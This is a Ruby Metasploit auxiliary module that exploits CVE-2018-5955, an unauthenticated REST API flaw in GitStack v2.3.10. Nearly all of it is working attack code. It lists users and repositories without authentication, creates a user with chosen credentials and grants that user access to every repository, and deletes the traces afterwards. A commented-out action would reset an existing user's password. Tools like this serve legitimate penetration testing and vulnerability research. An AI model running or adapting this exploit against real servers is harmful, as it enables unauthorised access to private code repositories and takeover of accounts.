##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'GitStack v2.3.10 REST API User Requests',
      'Description'  => %q{
        This modules exploits unauthenticated REST API requests on GitStack v2.3.10.
        The module supports requests for listing users of the application and listing
        available repositories. Additionally, the module can create a user and add the
        user to the application's repositories. Earlier versions of GitStack may be affected.
      },
      'Author'       =>
        [
          'Kacper Szurek',  # Vulnerability discovery and PoC
          'Jacob Robles'    # Metasploit module
        ],
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          ['CVE', '2018-5955'],
          ['EDB', '43777'],
          ['EDB', '44044']
        ],
      'DisclosureDate' => 'Jan 15 2018',
      'Actions'       =>
        [
          [
            'LIST',
            {
              'Description' => 'List application users',
              'Method'      => 'GET',
              'UserPath'    => '/rest/user/'
            }
          ],
          [
            'CREATE',
            {
              'Description' => 'Create a user on the application',
              'Method'      => 'POST',
              'List'        => 'GET',
              'UserPath'    => '/rest/user/',
              'RepoPath'    => '/rest/repository/'
            }
          ],
          # If this is uncommented, you will be able to change an
          # existing user's password.
          # After modifying the user's password, the user will be
          # added to all available repositories.
          # The cleanup action removes the user from all repositories
          # and then deletes the user... so this action may not be desirable.
          #[
            #'MODIFY',
            #{
              #'Description' => "Change the application user's password",
              #'Method'      => 'PUT',
              #'UserPath'    => '/rest/user/'
            #}
          #],
          [
            'LIST_REPOS',
            {
              'Description' => 'List available repositories',
              'Method'      => 'GET',
              'RepoPath'    => '/rest/repository/'
            }
          ],
          [
            'CLEANUP',
            {
              'Description' => 'Remove user from repositories and delete user',
              'List'        => 'GET',
              'Remove'      => 'DELETE',
              'RepoPath'    => '/rest/repository/',
              'UserPath'    => '/rest/user/'
            }
          ]
        ],
      'DefaultAction' => 'LIST'))

    register_options(
      [
        OptInt.new('RPORT', [true, 'The target port', 80]),
        OptString.new('USERNAME', [false, 'User to create or modify', 'msf']),
        OptString.new('PASSWORD', [false, 'Password for user', 'password'])
      ])
  end

  def get_list
    path = action.name =~ /REPOS/ ? action.opts['RepoPath'] : action.opts['UserPath']
    message = action.name =~ /REPOS/ ? "Repo List" : "User List"
    begin
      res = send_request_cgi({
        'uri'     =>  normalize_uri(path),
        'method'  =>  action.opts['Method']
      })
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
      return
    end
    if res && res.code == 200
      print_status("#{message}:")
      begin
        mylist = JSON.parse(res.body)
      rescue JSON::ParserError => e
        print_error("Failed: #{e.class} - #{e.message}")
        return
      end
      mylist.each do |item|
        if ["LIST"].include?(action.name)
          print_good("#{item}")
        else
          print_good("#{item['name']}")
        end
      end
    end
  end

  def clean_app
    path = action.opts['RepoPath']
    # Get all of the repository names
    begin
      res = send_request_cgi({
        'uri'     =>  normalize_uri(path),
        'method'  =>  action.opts['List']
      })
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
      return
    end

    # Parse the repository names
    if res && res.code == 200
      begin
        mylist = JSON.parse(res.body)
      rescue JSON::ParserError => e
        print_error("Failed: #{e.class} - #{e.message}")
        return
      end
    else
      print_error("Failed: #{res.body}")
      return
    end

    # Remove user from each repository
    mylist.each do |item|
      path = action.opts['RepoPath'] + item['name'] + '/user/' + datastore['USERNAME'] + '/'
      begin
        res = send_request_cgi({
          'uri'     =>  normalize_uri(path),
          'method'  =>  action.opts['Remove']
        })
      rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
             Rex::HostUnreachable, Errno::ECONNRESET => e
        print_error("Failed: #{e.class} - #{e.message}")
        return
      end

      if res && res.code == 200
        print_good("#{res.body}")
      else
        print_status("User #{datastore['USERNAME']} doesn't have access to #{item['name']}")
      end
    end

    # Delete the user account
    path = action.opts['UserPath'] + datastore['USERNAME'] + '/'
    begin
      res = send_request_cgi({
        'uri'     =>  normalize_uri(path),
        'method'  =>  action.opts['Remove']
      })
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
      return
    end

    # Check if the account was successfully deleted
    if res && res.code == 200
      print_good("#{res.body}")
    else
      print_error("#{res.body}")
    end
  end

  def add_user
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']

    begin
      data = 'username=' << user << '&password=' << pass
      res = send_request_cgi({
        'uri'     =>  normalize_uri(action.opts['UserPath']),
        'method'  =>  action.opts['Method'],
        'encode'  =>  true,
        'data'    =>  data
      })
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
      return
    end
    if res && res.code == 200
      print_good("SUCCESS: #{user}:#{pass}")
    else
      print_error("#{res.body}")
      return
    end

    # Make a request for the repositories
    begin
      res = send_request_cgi({
        'uri'     => normalize_uri(action.opts['RepoPath']),
        'method'  => action.opts['List']
      })
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
      return
    end

    if res && res.code == 200
      begin
        mylist = JSON.parse(res.body)
      rescue JSON::ParserError => e
        print_error("Failed: #{e.class} - #{e.message}")
        return
      end
      # Loop over repositories and add the user to it
      mylist.each do |item|
        path = action.opts['RepoPath'] + item['name'] + '/user/' + user + '/'
        begin
          res = send_request_cgi({
            'uri'     =>  normalize_uri(path),
            'method'  =>  action.opts['Method']
          })
        rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
              Rex::HostUnreachable, Errno::ECONNRESET => e
          print_error("Failed: #{e.class} - #{e.message}")
          next
        end
        if res && res.code == 200
          print_good("#{res.body}")
        else
          print_error("Failed to add user")
          print_error("#{res.body}")
        end
      end
    end
  end

  def run
    if ["LIST","LIST_REPOS"].include?(action.name)
      get_list
    elsif ["CLEANUP"].include?(action.name)
      clean_app
    elsif datastore['USERNAME'] && datastore['PASSWORD']
      add_user
    else
      print_error("USERNAME and PASSWORD required")
    end
  end
end
